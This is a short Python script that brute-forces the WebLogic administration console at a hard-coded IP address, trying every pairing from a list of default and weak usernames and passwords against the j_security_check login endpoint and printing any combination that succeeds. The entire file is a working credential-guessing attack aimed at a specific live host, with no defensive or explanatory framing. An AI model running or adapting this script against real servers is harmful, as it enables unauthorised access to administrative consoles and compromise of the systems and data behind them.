import requests


def weakPasswd():
    """weak password"""

    pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe',
               'wlcsystem', 'wlpisystem']
    for user in pwddict:
        for pwd in pwddict:
            data = {
                'j_username': user,
                'j_password': pwd,
                'j_character_encoding': 'UTF-8'
            }
            try:
                req = requests.post('http://167.86.78.228' + ':7001/console/j_security_check', data=data,
                                    allow_redirects=False, timeout=8, verify=False)
                if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                    print('[+] WebLogic username: ' + user + '  password: ' + pwd)
            except:
                pass



a = weakPasswd()
print(a)
